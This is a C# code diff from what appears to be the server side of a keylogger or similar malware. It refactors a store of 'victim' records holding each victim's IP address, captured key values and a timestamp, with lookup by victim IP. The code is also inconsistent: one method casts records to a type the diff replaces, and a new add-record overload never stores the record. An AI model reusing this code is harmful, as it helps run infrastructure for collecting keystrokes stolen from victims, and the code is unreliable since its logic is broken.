@@ -2,17 +2,50 @@
 
 namespace Server.Data
 {
+    class RecordData : ICloneable
+    {
+        public int Id { get; set; }
+        public string Ip { get; set; }
+        public int[] Keys { get; set; }
+        public DateTime Date { get; set; }
+
+        public object Clone()
+        {
+            return new RecordData
+            {
+                Id = this.Id,
+                Ip = this.Ip,
+                Keys = (int[])this.Keys.Clone(),
+                Date = this.Date
+            };
+        }
+    }
+
     class RecordsGenerator
     {
-        private static int GlobalId = 0;
+        private static int _globalId = 0;
+        public static int GlobalId {
+            get => _globalId; 
+            set {
+                if (_globalId < value)
+                    _globalId = value;
+            }
+        }
 
-        public static VictimRecord GenerateVictimRecord(string keys, string ip)
+        public static RecordData SetNewId(RecordData record)
         {
-            return new VictimRecord {
-                   Id = GlobalId++,
-                   VictimIp = ip,
+            record.Id = _globalId++;
+            return record;
+        }
+
+        public static RecordData GenerateVictimRecord(int[] keys, string ip)
+        {
+            return new RecordData
+            {
+                   Id = _globalId++,
+                   Ip = ip,
                    Date = DateTime.Now,
-                   Text = keys
+                   Keys = keys
             };
         }
     }
@@ -21,9 +54,9 @@ namespace Server.Data
     {
         private static object _locker = new();
         private static HashSet<string> _victims_ip = new HashSet<string>();
-        private static List<VictimRecord> _records = new List<VictimRecord>();
+        private static List<RecordData> _records = new List<RecordData>();
 
-        public static void AddRecord(string keys, string ip)
+        public static void AddRecord(int[] keys, string ip)
         {
             if (!_victims_ip.Contains(ip))
             {
@@ -36,16 +69,32 @@ namespace Server.Data
             }
         }
 
+        public static void AddRecord(RecordData record)
+        {
+            if (record.Id <= RecordsGenerator.GlobalId)
+                RecordsGenerator.SetNewId(record);
+            else
+                RecordsGenerator.GlobalId = record.Id;
+        }
+
+        public static List<VictimRecord> GetRecordsList()
+        {
+            return _records
+                .AsParallel()
+                .Select(r => (VictimRecord)r.Clone())
+                .ToList();
+        }
+
         public static List<string> GetVictimsIps()
         {
             return _victims_ip.ToList();
         }
 
-        public static List<VictimRecord> GetRecordsByIp(string ip)
+        public static List<RecordData> GetRecordsByIp(string ip)
         {
             return _records
                 .AsParallel()
-                .Where(r => r.VictimIp == ip)
+                .Where(r => r.Ip == ip)
                 .ToList();
         }
     }
